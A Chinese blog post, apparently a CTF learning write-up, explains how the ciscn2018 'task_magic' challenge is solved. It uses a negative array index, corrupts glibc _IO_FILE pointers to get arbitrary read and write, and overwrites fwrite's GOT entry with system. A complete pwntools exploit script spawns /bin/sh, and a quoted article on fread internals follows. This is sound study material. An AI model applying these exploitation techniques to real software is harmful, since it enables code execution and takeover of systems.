<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>学习IO_FILE的任意读和任意写 | DaJun的Blog | 我想变成大牛，很大的那种</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="pwn,IO_FILE">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":true,"app_id":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","app_key":"Qn93YchF3LXlS54tbXjzMvAI","icon":true}'),
            v: JSON.parse('{"enable":true,"appid":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","appkey":"Qn93YchF3LXlS54tbXjzMvAI","notify":true,"verify":true,"placeholder":"想说什么...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/girl.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">DaJun</h5>
          <a href="mailto:571986260@qq.com" title="571986260@qq.com" class="mail">
            
              <span>5</span>
            
              <span>7</span>
            
              <span>1</span>
            
              <span>9</span>
            
              <span>8</span>
            
              <span>6</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>0</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/DayJun" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>学习IO_FILE的任意读和任意写</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/dawn.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">学习IO_FILE的任意读和任意写</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-12-18T11:58:56.000Z" itemprop="datePublished" class="page-time">
  2019-12-18
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/学习日记/">学习日记</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-学习IO-FILE的任意读和任意写"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">学习IO_FILE的任意读和任意写</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-12-18 19:58:56" datetime="2019-12-18T11:58:56.000Z"  itemprop="datePublished">2019-12-18</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/学习日记/">学习日记</a></li></ul>



            
	<span id="/2019/12/18/学习IO-FILE的任意读和任意写/" class="leancloud_visitors" data-flag-title="学习IO_FILE的任意读和任意写" title="学习IO_FILE的任意读和任意写">
		
			<i class="icon icon-eye"></i>
		
		<span class="leancloud-visitors-count"></span>
	</span>
 

            
    <span class="leancloud-comment">
        <i class="icon icon-comment-o"></i>
        <a href="/2019/12/18/学习IO-FILE的任意读和任意写/#comment">
            <span class="valine-comment-count" data-xid="/2019/12/18/学习IO-FILE的任意读和任意写/"></span>
        </a>
    </span>



            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p>首先要参考：<a href="https://www.anquanke.com/post/id/194577" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194577</a></p>
<p>这里就照着ciscn2018的<code>task_magic</code>来写一写</p>
<p>文件都在：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/ciscn2018%20task_magic" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/dajun/binary/pwn_question/heap/ciscn2018 task_magic/task_magic'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以覆写got表，不能栈溢出，栈不可执行，没有开PIE</p>
<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p><code>wizard_spell</code>函数中，在取全局数组中的指针的时候，没有对索引进行检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v2; <span class="comment">// [rsp+3h] [rbp-3Dh]</span></span><br><span class="line">__int64 v3; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Who will spell:"</span>);</span><br><span class="line">v2 = read_int();</span><br><span class="line"><span class="keyword">if</span> ( !wizards[v2] || v2 &gt; <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"evil wizard!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">v3 = wizards[v2];</span><br></pre></td></tr></table></figure>

<p>所以<code>v2</code>可以是负数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020E0 log_file        dq ?                    ; DATA XREF: main:loc_400A3D↑r</span><br><span class="line">.bss:00000000006020E0                                         ; main+D2↑r ...</span><br><span class="line">.bss:00000000006020E8                 align 10h</span><br><span class="line">.bss:00000000006020F0                 public wizards</span><br><span class="line">.bss:00000000006020F0 ; __int64 wizards[3]</span><br><span class="line">.bss:00000000006020F0 wizards         dq ?                    ; DATA XREF: create_wizard+1D↑r</span><br><span class="line">.bss:00000000006020F0                                         ; create_wizard+C2↑w ...</span><br></pre></td></tr></table></figure>

<p>当<code>v2</code>是-2的时候，就可以取到<code>log_file</code>作为指针进行操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> __<span class="function">fastcall <span class="title">write_spell</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">size_t</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fwrite(a1, a2, <span class="number">1u</span>LL, log_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">read_spell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fread(&amp;ptr, <span class="number">1u</span>LL, <span class="number">0x20</span>uLL, log_file);</span><br><span class="line">  write(<span class="number">1</span>, &amp;ptr, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个函数就是对取出指针操作的函数，其中第一个函数是往<code>log_file</code>所指向的文件写，第二个是从中读</p>
<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p>文件中有这么一个操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)(v3 + <span class="number">40</span>) -= <span class="number">0x32</span>LL;</span><br></pre></td></tr></table></figure>

<p>如果<code>v3</code>指向的是<code>log_file</code>的话，这个就是在对<code>log_file</code>所指向的<code>_IO_FILE</code>结构体的<code>_IO_write_ptr</code>进行操作</p>
<p>而<code>_IO_write_ptr</code>指向的是当前应该往哪里写入</p>
<h2 id="得到libc地址"><a href="#得到libc地址" class="headerlink" title="得到libc地址"></a>得到libc地址</h2><p>一直对<code>_IO_write_ptr</code>进行减0x32，直到它的指针指向<code>log_file</code>这个<code>_IO_FILE</code>结构体的头部之前的地方</p>
<p>此时调用<code>write_spell</code>函数的话，就会向<code>_IO_write_ptr</code>所指向的地址写你所输入的数据</p>
<p>所以我们可以把<code>_IO_read_ptr</code>和<code>_IO_read_end</code>分别覆盖成<code>puts_got</code>和<code>puts_got+0x60</code></p>
<p>这时通过<code>read_spell</code>函数读的话，读出来的数据就是<code>puts_got</code>附近的数据，我们就得到了puts的libc中的地址</p>
<p>同时<code>_IO_read_ptr</code>自增0x20</p>
<h2 id="修改got表"><a href="#修改got表" class="headerlink" title="修改got表"></a>修改got表</h2><p>我选择的是<code>fwrite</code></p>
<p>在<code>fread</code>的时候，如果<code>_IO_read_end ==_IO_read_ptr</code>的话，就会调用<code>__underflow</code>函数</p>
<blockquote>
<p>_IO_new_file_underflow中在执行系统调用之前会设置一次FILE指针，将<br>_IO_read_base、_IO_read_ptr、fp-&gt;_IO_read_end、_IO_write_base、IO_write_ptr全部设置为_IO_buf_base。</p>
</blockquote>
<p>我们便可以再调用两次<code>fread</code>，一次用来填充，一次用来覆盖<code>_IO_buf_base</code></p>
<p>这时候相等条件就成立了</p>
<p>下一次<code>fwrite</code>的时候，就会把我们的输入写到<code>_IO_buf_base</code>所指向的内存，即<code>strcpy</code>的got</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x:log.success(x)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./task_magic'</span></span><br><span class="line">io = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(name)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'name:'</span>)</span><br><span class="line">    s(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spell</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'spell:'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">'name:'</span>)</span><br><span class="line">    s(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">final</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'chance:'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">fwrite_got = <span class="number">0x602090</span></span><br><span class="line"></span><br><span class="line">create(<span class="string">'xxx'</span>)</span><br><span class="line">spell(<span class="number">0</span>, <span class="string">'/bin/sh\x00'</span>)	<span class="comment">#这两步是为了初始化log_file的_IO_FILE结构</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span>*<span class="number">30</span>)</span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)	<span class="comment"># 这几步执行完，_IO_write_ptr就会指向log_file-2的位置</span></span><br><span class="line">spell(<span class="number">0</span>, <span class="string">'\x00\x00'</span> + p64(<span class="number">0xfbad24a8</span>))	<span class="comment">#这是为了填充的，原来的flag符合我们利用的条件，所以不用改</span></span><br><span class="line">spell(<span class="number">0</span>, p64(puts_got) + p64(puts_got+<span class="number">0x60</span>))</span><br><span class="line">puts_address = u64(rn(<span class="number">8</span>))	<span class="comment">#这两步就完成了libc地址的leak</span></span><br><span class="line">success(<span class="string">"puts address: 0x%x"</span> %(puts_address))</span><br><span class="line">libc_base = puts_address - <span class="number">0x6f690</span></span><br><span class="line">success(<span class="string">"libc base: 0x%x"</span> %(libc_base))</span><br><span class="line">sys_address = libc_base + <span class="number">0x45390</span></span><br><span class="line">success(<span class="string">"system address: 0x%x"</span> %(sys_address))</span><br><span class="line">spell(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)	<span class="comment"># 这是为了填充的</span></span><br><span class="line">spell(<span class="number">0</span>, p64(fwrite_got)+p64(fwrite_got+<span class="number">0x100</span>)+p64(fwrite_got+<span class="number">50</span>))	<span class="comment">#主要起作用的其实只有最后一项</span></span><br><span class="line">spell(<span class="number">-2</span>, <span class="string">'\x00'</span>)	<span class="comment"># 为了让_IO_read_end ==_IO_read_ptr</span></span><br><span class="line">spell(<span class="number">0</span>, p64(sys_address))	<span class="comment"># 把fwrite的got覆盖成system</span></span><br><span class="line">spell(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span>)	<span class="comment"># 这里它会执行fwrite("/bin/sh")即system("/bin/sh")</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="贴上人家的原文"><a href="#贴上人家的原文" class="headerlink" title="贴上人家的原文"></a>贴上人家的原文</h1><blockquote>
<p>本文将简单介绍一下scanf的长度绕过和由fwrite、fread实现的任意读写，然后用两个ctf例题（2018年的两道国赛题 echo_back 和 magic）来加深理解。</p>
<p>本文中write_s,write_e,read_s,read_e分别表示开始写入的开始结束地址、读取的开始结束地址。</p>
<h2 id="fread-之-stdin任意写"><a href="#fread-之-stdin任意写" class="headerlink" title="fread 之 stdin任意写"></a>fread 之 stdin任意写</h2><p>网上介绍fread源码分析的文章很多，所以本文就不着重分析他的详细流程了。</p>
<p>首先先介绍一下file结构(FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。 FILE结构在程序执行fopen等函数时会进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值。)</p>
<p>FILE结构定义在libio.h中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">&gt;   <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">&gt;   <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">&gt;   <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">&gt;   <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">&gt;   <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="keyword">int</span> _fileno;</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">&gt;   <span class="keyword">int</span> _blksize;</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">&gt;   <span class="keyword">int</span> _flags2;</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;   _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">&gt;   <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">&gt;   <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">&gt;   <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">&gt;   <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   _IO_lock_t *_lock;</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&gt; &#125;;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>先着重介绍其中要用到的指针：</p>
<ul>
<li>_IO_buf_base：输入（出）缓冲区的基地址，_IO_file_xsgetn函数会通过它来判断输入缓冲区是否为空，为空则会调用_IO_doallocbuf函数来进行初始化。</li>
<li>_IO_buf_end：输入（出）缓冲区的结束地址。</li>
<li>_IO_read_ptr：指向当前要写入的地址。</li>
<li>_IO_read_end：一般和_IO_read_ptr共同使用，_IO_read_end-_IO_read_ptr表示可用的输入缓冲区大小。</li>
</ul>
<p>接下来是实现任意写的过程：</p>
<p>在_IO_file_xsgetn中：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">&gt; 会判断输入缓冲区是否为空，为空则调用_IO_doallocbuf。</span><br><span class="line">&gt; 我们是不希望他初始化缓冲区的，所以要构造fp-&gt;_IO_buf_base != <span class="literal">NULL</span></span><br><span class="line">&gt; have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">&gt; </span><br><span class="line">&gt;       <span class="keyword">if</span> (have &gt; <span class="number">0</span>) </span><br><span class="line">&gt;       &#123;</span><br><span class="line">&gt;           将输入缓冲区中的内容拷贝至目标地址。</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; 这里我们要实现任意写，就不能满足这个条件，一般构造_IO_read_end ==_IO_read_ptr，这样的话缓冲区就满足不了当前的需求，就会接着调用__underflow</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>__underflow（_IO_new_file_underflow）中有两个判断需要绕过：</p>
<p>1、</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">&gt; </span><br><span class="line">&gt; 满足的话就会直接返回；所以这里要保证_flag位中不能有四。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>2、</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">&gt;     <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&gt; </span><br><span class="line">&gt; 这里满足的话也会直接返回，所以我们一般构造_IO_read_end ==_IO_read_ptr。</span><br><span class="line">&gt; </span><br><span class="line">&gt; 因为最终调用的是read (fp-&gt;_fileno, buf, size))，所以我们还要构造</span><br><span class="line">&gt; fp-&gt;_fileno为<span class="number">0</span>。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>小结一下：</p>
<ul>
<li>设置_IO_buf_base为write_s，_IO_buf_end为write_end（_IO_buf_end-_IO_buf_base要大于0）</li>
<li>flag位不能含有4（_IO_NO_READS），_fileno要为0。（最好就直接使用原本的flag）</li>
<li>设置_IO_read_end等于_IO_read_ptr。</li>
</ul>
<p>_IO_new_file_underflow中在执行系统调用之前会设置一次FILE指针，将<br>_IO_read_base、_IO_read_ptr、fp-&gt;_IO_read_end、_IO_write_base、IO_write_ptr全部设置为_IO_buf_base。</p>
<p>这个内容后面的题目magic要用到，先在这里提一下。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;   fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">&gt;   fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">&gt;   fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">&gt;     = fp-&gt;_IO_buf_base;</span><br><span class="line">&gt; </span><br><span class="line">&gt;   count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">&gt;            fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<h2 id="scanf-的长度修改："><a href="#scanf-的长度修改：" class="headerlink" title="scanf 的长度修改："></a>scanf 的长度修改：</h2><p>scanf是调用stdin中的_IO_new_file_underflow去调用read的（和fread相同）。</p>
<p>这里依旧是上面的那几个关键代码：</p>
